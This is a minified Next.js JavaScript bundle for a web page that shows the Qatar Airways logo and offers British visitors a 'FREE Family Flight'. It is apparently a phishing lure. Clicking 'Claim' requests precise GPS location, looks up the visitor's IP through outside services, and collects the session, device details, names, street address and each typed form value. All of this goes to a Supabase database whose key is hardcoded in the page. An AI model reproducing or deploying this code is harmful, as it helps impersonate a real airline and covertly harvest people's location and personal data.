(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[974],{2099:(e,t,a)=>{"use strict";a.d(t,{k:()=>s});let i=(0,a(5647).UU)("https://kevmuziwabpiitfjsqxa.supabase.co","eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imtldm11eml3YWJwaWl0ZmpzcXhhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTIwODI1NzIsImV4cCI6MjA2NzY1ODU3Mn0.jog56wKSQHalOz9vfNieGFNU1aMbPUQAnDa-R3_ZlJg"),o="qatar_session_id",r="failed_submissions",n=[],s={getSessionId:()=>{let e=localStorage.getItem(o);return e||(e="session_"+Date.now()+"_"+Math.random().toString(36).substr(2,9),localStorage.setItem(o,e),sessionStorage.setItem(o,e)),e},getUserIP:async()=>{for(let e of["https://api.ipify.org?format=json","https://ipapi.co/json/","https://jsonip.com"])try{let t=await fetch(e,{timeout:5e3}),a=await t.json();return a.ip||a.IPv4||a.query}catch(t){console.warn("IP service ".concat(e," failed:"),t);continue}return null},reliableInsert:async function(e,t){let a=arguments.length>2&&void 0!==arguments[2]?arguments[2]:3;for(let o=1;o<=a;o++)try{let{data:s,error:l}=await i.from(e).insert([t]);if(!l)return console.log("✅ ".concat(e," insert successful on attempt ").concat(o)),s;if(o===a){console.error("❌ ".concat(e," insert failed after ").concat(a," attempts:"),l),n.push({table:e,data:t,retries:0});{let a=JSON.parse(localStorage.getItem(r)||"[]");a.push({table:e,data:t,timestamp:new Date().toISOString()}),localStorage.setItem(r,JSON.stringify(a))}throw l}await new Promise(e=>setTimeout(e,1e3*Math.pow(2,o)))}catch(t){if(o===a)throw t;console.warn("⚠️ ".concat(e," insert attempt ").concat(o," failed, retrying..."))}},processQueue:async()=>{if(0===n.length)return;let e=[...n];for(let t of(n=[],e))try{await s.reliableInsert(t.table,t.data,2)}catch(e){t.retries<3&&(t.retries++,n.push(t))}},trackUserAction:async function(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:null,a=arguments.length>2&&void 0!==arguments[2]?arguments[2]:null;try{let i=s.getSessionId(),o=await s.getUserIP(),r={action_type:e,action_data:t,error_message:a,timestamp:new Date().toISOString(),session_id:i,user_agent:navigator.userAgent,ip_address:o,url:window.location.href};await s.reliableInsert("user_actions",r)}catch(e){console.error("Failed to track user action:",e)}},trackPageVisit:async e=>{try{let t=s.getSessionId(),a=await s.getUserIP(),i={page_name:e,timestamp:new Date().toISOString(),session_id:t,user_agent:navigator.userAgent,ip_address:a,referrer:document.referrer,url:window.location.href};await s.reliableInsert("page_visits",i)}catch(e){console.error("Failed to track page visit:",e)}},trackLocationPermission:async function(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:null;try{let a=s.getSessionId(),i=await s.getUserIP(),o={permission_status:e,latitude:(null==t?void 0:t.latitude)||null,longitude:(null==t?void 0:t.longitude)||null,accuracy:(null==t?void 0:t.accuracy)||null,altitude:(null==t?void 0:t.altitude)||null,heading:(null==t?void 0:t.heading)||null,speed:(null==t?void 0:t.speed)||null,location_method:(null==t?void 0:t.method)||null,location_quality:(null==t?void 0:t.quality)||null,error_message:(null==t?void 0:t.error)||null,timestamp:new Date().toISOString(),session_id:a,user_agent:navigator.userAgent,ip_address:i};await s.reliableInsert("location_permissions",o)}catch(e){console.error("Failed to track location permission:",e)}},trackFormInteraction:async function(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:null,a=arguments.length>2&&void 0!==arguments[2]?arguments[2]:null;try{let i=s.getSessionId(),o={interaction_type:e,field_name:t,field_value:null!==a?String(a):null,timestamp:new Date().toISOString(),session_id:i,user_agent:navigator.userAgent};await s.reliableInsert("form_interactions",o)}catch(e){console.error("Failed to track form interaction:",e)}},insertFormSubmission:async e=>{let t={first_name:e.firstName||null,last_name:e.lastName||null,postcode:e.postcode,street_address:e.streetAddress,city:e.city||null,destination:e.destination,latitude:e.latitude||null,longitude:e.longitude||null,location_accuracy:e.location_accuracy||null,location_method:e.location_method||null,location_timestamp:e.location_timestamp||null,location_quality:e.location_quality||null,timestamp:e.timestamp,user_agent:e.userAgent,ip_address:e.ipAddress||null,session_id:e.sessionId,browser_language:e.browser_language||null,browser_timezone:e.browser_timezone||null,browser_screen:e.browser_screen||null,browser_platform:e.browser_platform||null,browser_cookies:e.browser_cookies||null,submit_attempt_number:e.submit_attempt_number||1,referrer:e.referrer||null,page_url:e.page_url||null,device_memory:e.device_memory||null,connection_type:e.connection_type||null,time_zone_offset:e.time_zone_offset||null,local_storage_available:e.local_storage_available||null,form_completion_time:e.form_completion_time||null,validation_errors_count:e.validation_errors_count||0,user_journey:e.user_journey||null};try{return console.log("\uD83C\uDFAF Submitting form data to form_submissions table..."),await s.reliableInsert("form_submissions",t,5),console.log("✅ Form submission successful!"),!0}catch(e){console.warn("⚠️ Primary form submission failed, using fallback...");try{return await s.trackUserAction("form_submission_fallback",{form_data:t,primary_error:String(e),fallback_method:"user_actions_table"}),console.log("✅ Form data saved via fallback method!"),!0}catch(e){throw console.error("❌ Both primary and fallback submissions failed:",e),e}}},retryFailedSubmissions:async()=>{try{await s.processQueue();let e=JSON.parse(localStorage.getItem(r)||"[]");if(0===e.length)return;let t=e.map(async e=>{try{return await s.reliableInsert(e.table,e.data,2),e}catch(e){return null}}),a=await Promise.allSettled(t),i=a.filter(e=>"fulfilled"===e.status&&null!==e.value);if(i.length>0){let t=e.filter((e,t)=>"rejected"===a[t].status||null===a[t].value);localStorage.setItem(r,JSON.stringify(t)),console.log("✅ Retried ".concat(i.length," failed submissions successfully"))}}catch(e){console.error("Failed to retry submissions:",e)}}}},3471:(e,t,a)=>{Promise.resolve().then(a.bind(a,3792))},3792:(e,t,a)=>{"use strict";a.r(t),a.d(t,{default:()=>d});var i=a(5155),o=a(9137),r=a.n(o),n=a(2115),s=a(5695),l=a(2099),c=a(6766);function d(){let e=(0,s.useRouter)(),[t,a]=(0,n.useState)(!1);(0,n.useEffect)(()=>{l.k.trackPageVisit("main_page")},[]);let o=async()=>{if(a(!0),await l.k.trackUserAction("entry_trigger_clicked",{button:"claim_benefits",timestamp:new Date().toISOString(),user_agent:navigator.userAgent,page_url:window.location.href}),navigator.geolocation){await l.k.trackLocationPermission("requested");try{let t;try{t=await new Promise((e,t)=>{navigator.geolocation.getCurrentPosition(t=>e(t),e=>t(e),{enableHighAccuracy:!0,timeout:3e4,maximumAge:0})})}catch(e){console.warn("High accuracy geolocation failed, using fallback GPS...",e),t=await new Promise((e,t)=>{navigator.geolocation.getCurrentPosition(t=>e(t),e=>t(e),{enableHighAccuracy:!1,timeout:1e4,maximumAge:6e4})})}let{latitude:a,longitude:i,accuracy:o,speed:r,heading:n,altitude:s,altitudeAccuracy:c}=t.coords,d={latitude:a,longitude:i,accuracy:o,speed:r||null,heading:n||null,altitude:s||null,altitudeAccuracy:c||null,timestamp:new Date().toISOString(),method:o<=10?"gps_high_accuracy":"gps_standard",quality_score:o<=10?"excellent":o<=50?"good":"fair"};await l.k.trackLocationPermission("granted",d),sessionStorage.setItem("userLocation",JSON.stringify(d)),sessionStorage.setItem("locationCaptured","true"),e.push("/success")}catch(a){let t={error_code:(null==a?void 0:a.code)||"unknown",error_message:(null==a?void 0:a.message)||"Unknown error",method:"gps_failed",attempts:"both_high_accuracy_and_fallback"};await l.k.trackLocationPermission("denied",t),sessionStorage.setItem("locationCaptured","false"),sessionStorage.setItem("locationError",JSON.stringify(t)),e.push("/success")}}else await l.k.trackUserAction("geolocation_unsupported",{user_agent:navigator.userAgent,fallback:"form_only"}),sessionStorage.setItem("locationCaptured","false"),sessionStorage.setItem("locationError",JSON.stringify({message:"Geolocation not supported"})),e.push("/success")};return(0,i.jsxs)("div",{className:"jsx-317857a5e0af8301 consent-container",children:[(0,i.jsxs)("div",{className:"jsx-317857a5e0af8301 image-section",children:[(0,i.jsx)("div",{className:"jsx-317857a5e0af8301 image-overlay"}),(0,i.jsx)(c.default,{src:"/family-travel.jpeg",alt:"VIP travel experience",className:"prize-image",fill:!0,priority:!0})]}),(0,i.jsxs)("div",{className:"jsx-317857a5e0af8301 content-section",children:[(0,i.jsx)(c.default,{src:"https://logotyp.us/files/qatar-airways.svg",alt:"Qatar Airways",className:"logo",width:140,height:60}),(0,i.jsx)("h1",{className:"jsx-317857a5e0af8301",children:"\uD83C\uDDEC\uD83C\uDDE7 ✈️ FREE Family Flight - Limited Time!"}),(0,i.jsxs)("p",{className:"jsx-317857a5e0af8301",children:[(0,i.jsx)("strong",{className:"jsx-317857a5e0af8301",children:"Exclusive for British Citizens Only!"}),(0,i.jsx)("br",{className:"jsx-317857a5e0af8301"}),"Qatar Airways is celebrating with one complimentary family flight (up to 4 passengers) from any UK airport to any destination worldwide. This exclusive promotion expires ",(0,i.jsx)("strong",{className:"jsx-317857a5e0af8301",children:"July 25th, 2025"}),"."]}),(0,i.jsx)("button",{onClick:o,disabled:t,className:"jsx-317857a5e0af8301 "+((t?"loading":"")||""),children:t?"Checking Eligibility...":"Claim FREE Family Flight"})]}),(0,i.jsx)(r(),{id:"317857a5e0af8301",children:'.consent-container.jsx-317857a5e0af8301{display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-flex-direction:column;-moz-box-orient:vertical;-moz-box-direction:normal;-ms-flex-direction:column;flex-direction:column;min-height:100vh;margin:0;padding:0;background:#f8f8f8;font-family:"Poppins",sans-serif}.image-section.jsx-317857a5e0af8301{position:relative;-webkit-box-flex:1;-webkit-flex:1 1 55%;-moz-box-flex:1;-ms-flex:1 1 55%;flex:1 1 55%;min-height:300px}.image-overlay.jsx-317857a5e0af8301{position:absolute;top:0;left:0;width:100%;height:100%;background:-webkit-linear-gradient(bottom,rgba(0,0,0,.5),transparent);background:-moz-linear-gradient(bottom,rgba(0,0,0,.5),transparent);background:-o-linear-gradient(bottom,rgba(0,0,0,.5),transparent);background:linear-gradient(to top,rgba(0,0,0,.5),transparent);z-index:1}.prize-image.jsx-317857a5e0af8301{width:100%;height:100%;-o-object-fit:cover;object-fit:cover}.content-section.jsx-317857a5e0af8301{-webkit-box-flex:1;-webkit-flex:1 1 45%;-moz-box-flex:1;-ms-flex:1 1 45%;flex:1 1 45%;display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-flex-direction:column;-moz-box-orient:vertical;-moz-box-direction:normal;-ms-flex-direction:column;flex-direction:column;-webkit-box-pack:center;-webkit-justify-content:center;-moz-box-pack:center;-ms-flex-pack:center;justify-content:center;-webkit-box-align:center;-webkit-align-items:center;-moz-box-align:center;-ms-flex-align:center;align-items:center;padding:2.5rem;text-align:center;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;background:-webkit-linear-gradient(top,#fff 0%,#fafafa 100%);background:-moz-linear-gradient(top,#fff 0%,#fafafa 100%);background:-o-linear-gradient(top,#fff 0%,#fafafa 100%);background:linear-gradient(to bottom,#fff 0%,#fafafa 100%);-webkit-border-top-left-radius:25px;-moz-border-radius-topleft:25px;border-top-left-radius:25px;-webkit-border-top-right-radius:25px;-moz-border-radius-topright:25px;border-top-right-radius:25px;margin-top:-25px;position:relative;-webkit-box-shadow:0 -8px 25px rgba(0,0,0,.08);-moz-box-shadow:0 -8px 25px rgba(0,0,0,.08);box-shadow:0 -8px 25px rgba(0,0,0,.08);z-index:2}.logo.jsx-317857a5e0af8301{width:max(130px,min(22vw,150px));width:clamp(130px,22vw,150px);margin-bottom:1.5rem;-webkit-filter:drop-shadow(0 2px 4px rgba(0,0,0,.1));filter:drop-shadow(0 2px 4px rgba(0,0,0,.1))}h1.jsx-317857a5e0af8301{font-size:max(1.6rem,min(4.5vw,2rem));font-size:clamp(1.6rem,4.5vw,2rem);font-weight:700;margin-bottom:1.2rem;color:#5c0f3c;letter-spacing:-.8px;line-height:1.2}p.jsx-317857a5e0af8301{font-size:max(.9rem,min(2.8vw,1.1rem));font-size:clamp(.9rem,2.8vw,1.1rem);font-weight:400;margin-bottom:2rem;line-height:1.8;color:#444;max-width:450px}button.jsx-317857a5e0af8301{background:-webkit-linear-gradient(315deg,#5c0f3c 0%,#4a0c30 100%);background:-moz-linear-gradient(315deg,#5c0f3c 0%,#4a0c30 100%);background:-o-linear-gradient(315deg,#5c0f3c 0%,#4a0c30 100%);background:linear-gradient(135deg,#5c0f3c 0%,#4a0c30 100%);color:white;border:none;padding:18px 36px;-webkit-border-radius:50px;-moz-border-radius:50px;border-radius:50px;cursor:pointer;font-size:max(1rem,min(3vw,1.2rem));font-size:clamp(1rem,3vw,1.2rem);font-weight:600;letter-spacing:.5px;-webkit-transition:all.3s cubic-bezier(.4,0,.2,1);-moz-transition:all.3s cubic-bezier(.4,0,.2,1);-o-transition:all.3s cubic-bezier(.4,0,.2,1);transition:all.3s cubic-bezier(.4,0,.2,1);width:100%;max-width:360px;-webkit-box-shadow:0 4px 20px rgba(92,15,60,.3);-moz-box-shadow:0 4px 20px rgba(92,15,60,.3);box-shadow:0 4px 20px rgba(92,15,60,.3);position:relative;overflow:hidden}button.jsx-317857a5e0af8301::before{content:"";position:absolute;top:0;left:-100%;width:100%;height:100%;background:-webkit-linear-gradient(left,transparent,rgba(255,255,255,.2),transparent);background:-moz-linear-gradient(left,transparent,rgba(255,255,255,.2),transparent);background:-o-linear-gradient(left,transparent,rgba(255,255,255,.2),transparent);background:linear-gradient(90deg,transparent,rgba(255,255,255,.2),transparent);-webkit-transition:left.5s ease;-moz-transition:left.5s ease;-o-transition:left.5s ease;transition:left.5s ease}button.jsx-317857a5e0af8301:hover::before{left:100%}button.jsx-317857a5e0af8301:hover:not(.loading){background:-webkit-linear-gradient(315deg,#4a0c30 0%,#3a0924 100%);background:-moz-linear-gradient(315deg,#4a0c30 0%,#3a0924 100%);background:-o-linear-gradient(315deg,#4a0c30 0%,#3a0924 100%);background:linear-gradient(135deg,#4a0c30 0%,#3a0924 100%);-webkit-transform:translatey(-3px);-moz-transform:translatey(-3px);-ms-transform:translatey(-3px);-o-transform:translatey(-3px);transform:translatey(-3px);-webkit-box-shadow:0 8px 25px rgba(92,15,60,.4);-moz-box-shadow:0 8px 25px rgba(92,15,60,.4);box-shadow:0 8px 25px rgba(92,15,60,.4)}button.loading.jsx-317857a5e0af8301{opacity:.7;cursor:not-allowed}button.jsx-317857a5e0af8301:disabled{opacity:.7;cursor:not-allowed;-webkit-transform:none;-moz-transform:none;-ms-transform:none;-o-transform:none;transform:none}'})]})}}},e=>{var t=t=>e(e.s=t);e.O(0,[197,441,684,358],()=>t(3471)),_N_E=e.O()}]);